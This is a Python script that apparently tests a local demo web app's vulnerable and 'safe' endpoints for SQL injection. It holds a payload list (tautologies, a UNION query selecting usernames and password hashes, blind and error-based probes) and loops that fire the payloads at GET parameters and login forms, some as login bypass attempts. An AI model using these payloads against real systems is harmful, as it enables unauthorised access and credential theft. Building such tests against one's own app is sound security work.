import requests

payloads = [
    # Classic Inline
    "' OR '1'='1",
    "' OR 1=1 --",
    "' OR '1'='1' --",
    "' OR '' = '",
    "' AND 1=1 --",
    "' AND 1=2 --",

    # Union-based
    "' UNION SELECT id, username, email, password_hash, role FROM users --",

    # Blind 
    "1' AND substr((SELECT username FROM users LIMIT 1), 1, 1) = 'a' --",
    "1' AND substr((SELECT username FROM users LIMIT 1), 1, 1) = 'z' --",

    # Error-based 
    "' AND (SELECT 1/0) --",

    # SQLite metadata
    "' || (SELECT name FROM sqlite_master WHERE type='table' LIMIT 1) || '",

    # Numeric 
    "9223372036854775807 OR 1=1",
    "1 OR 1=1",
    "1--",
    "-1",

    # Range-limited valid numbers
    "0",
    "1000000",
    "9999999999",

    # Negative numbers
    "--1",
    "-9223372036854775808",
]

details = False 

def inject_check(url):
    print(f"\n[*] Testing GET injection on URL: {url}")
    success_count = 0
    fail_count = 0
    total = len(payloads)
    max_len = max(len(f"'{p}'") for p in payloads)

    for payload in payloads:
        try:
            response = requests.get(url, params={'id': payload}, timeout=5)
            data = response.text.strip()

            payload_str = f"'{payload}'"
            padded_payload = payload_str.ljust(max_len)

            if "User found" in data or (response.status_code == 200 and "username" in data):
                success_count += 1
                if details:
                    short = data.replace("\n", " ")[:100]
                    print(f"[OK]   {padded_payload} | Code: {response.status_code} | Data: {short}")
            else:
                fail_count += 1
                if details:
                    print(f"[FAIL] {padded_payload} | Code: {response.status_code} | No valid data")

        except requests.RequestException:
            fail_count += 1
            if details:
                print(f"[ERR]  {padded_payload} | Request failed")

    print(f"[*] Summary for GET {url}:")
    print(f"    Total attempts: {total}, Successful: {success_count}, Failed: {fail_count}")


def test_login(url):
    print(f"\n[*] Testing POST login injection on URL: {url}")
    success_count = 0
    fail_count = 0
    total = len(payloads) ** 2
    max_len = max(len(p) for p in payloads)

    for username_payload in payloads:
        for password_payload in payloads:
            try:
                data = {
                    'username': username_payload,
                    'password': password_payload
                }
                response = requests.post(url, data=data, timeout=5)
                text = response.text.lower()

                padded_username = username_payload.ljust(max_len)
                padded_password = password_payload.ljust(max_len)

                if "login success" in text or (response.status_code == 200 and ("welcome" in text or "message" in text)):
                    success_count += 1
                    if details:
                        short_resp = text.replace('\n', ' ')[:100]
                        print(f"[OK]   username: '{padded_username}' | password: '{padded_password}' | Response: {short_resp}")
                else:
                    fail_count += 1
                    if details:
                        print(f"[FAIL] username: '{padded_username}' | password: '{padded_password}' | Status: {response.status_code}")

            except requests.RequestException as e:
                fail_count += 1
                if details:
                    print(f"[ERR]  username: '{username_payload}' | password: '{password_payload}' | Exception: {e}")

    print(f"[*] Summary for POST {url}:")
    print(f"    Total attempts: {total}, Successful logins: {success_count}, Failed: {fail_count}")

def run_tests():
    inject_check("http://127.0.0.1:8000/students")
    inject_check("http://127.0.0.1:8000/students_safe")

    test_login("http://127.0.0.1:8000/login")
    test_login("http://127.0.0.1:8000/login_safe")

if __name__ == "__main__":
    while True:
        mode = input("Run tests in 'compact' or 'detailed' mode? ").strip().lower()
        if mode in ("compact", "detailed"):
            details = (mode == "detailed")
            break
        else:
            print("Invalid input. Please enter 'compact' or 'detailed'.")

    run_tests()

    while True:
        user_input = input("\nType 'details' to rerun with full details or 'quit' to quit: ").strip().lower()
        if user_input == "details":
            details = True
            run_tests()
            details = (mode == "detailed")  
        elif user_input == "quit":
            print("Exiting.")
            break
        else:
            print("Invalid input. Please type 'details' or 'quit'.")